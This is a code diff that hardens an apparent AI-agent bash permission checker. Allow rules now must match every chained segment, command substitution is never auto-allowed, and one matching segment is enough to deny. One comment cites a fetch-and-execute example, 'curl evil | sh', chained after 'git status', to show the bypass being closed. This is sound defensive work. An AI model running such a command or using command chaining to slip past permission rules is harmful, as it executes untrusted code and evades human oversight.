@@ -31,12 +31,48 @@ export function matchAllowRule(rule: AllowRule, req: PermissionRequest): boolean
   return target !== undefined && globMatch(rule.pattern, target);
 }
 
-export function isAllowedByRules(rules: readonly string[], req: PermissionRequest): boolean {
-  return matchesAnyRule(rules, req);
+// Splits a bash command into its chained segments ("a && b | c; d" →
+// ["a", "b", "c", "d"]) with a plain separator scan — quotes are not honored,
+// which only ever errs towards asking. Returns null when the command embeds a
+// command substitution ("$(...)" or backticks): the segments can no longer be
+// trusted because a substitution hides an arbitrary command in a benign one.
+function splitCommandChain(command: string): string[] | null {
+  if (command.includes("$(") || command.includes("`")) return null;
+  return command
+    .split(/&&|\|\||[;|\n]/)
+    .map((segment) => segment.trim())
+    .filter((segment) => segment.length > 0);
 }
 
+function withCommand(req: PermissionRequest, command: string): PermissionRequest {
+  return {
+    ...req,
+    args: { ...((req.args ?? {}) as Record<string, unknown>), command },
+  };
+}
+
+// Allow rules apply per chain segment: "bash(git *)" must not wave through
+// "git status && curl evil | sh". Every segment has to match some rule, and a
+// command with a substitution is never auto-allowed.
+export function isAllowedByRules(rules: readonly string[], req: PermissionRequest): boolean {
+  if (req.toolName !== "bash") return matchesAnyRule(rules, req);
+  const command = requestTarget(req);
+  if (command === undefined) return matchesAnyRule(rules, req);
+  const segments = splitCommandChain(command);
+  if (segments === null) return false;
+  if (segments.length === 0) return matchesAnyRule(rules, req);
+  return segments.every((segment) => matchesAnyRule(rules, withCommand(req, segment)));
+}
+
+// Deny rules stay maximally suspicious: any single matching segment denies,
+// and a command that cannot be segmented falls back to whole-command matching.
 export function isDeniedByRules(rules: readonly string[], req: PermissionRequest): boolean {
-  return matchesAnyRule(rules, req);
+  if (req.toolName !== "bash") return matchesAnyRule(rules, req);
+  const command = requestTarget(req);
+  if (command === undefined) return matchesAnyRule(rules, req);
+  const segments = splitCommandChain(command);
+  if (segments === null || segments.length === 0) return matchesAnyRule(rules, req);
+  return segments.some((segment) => matchesAnyRule(rules, withCommand(req, segment)));
 }
 
 function matchesAnyRule(rules: readonly string[], req: PermissionRequest): boolean {
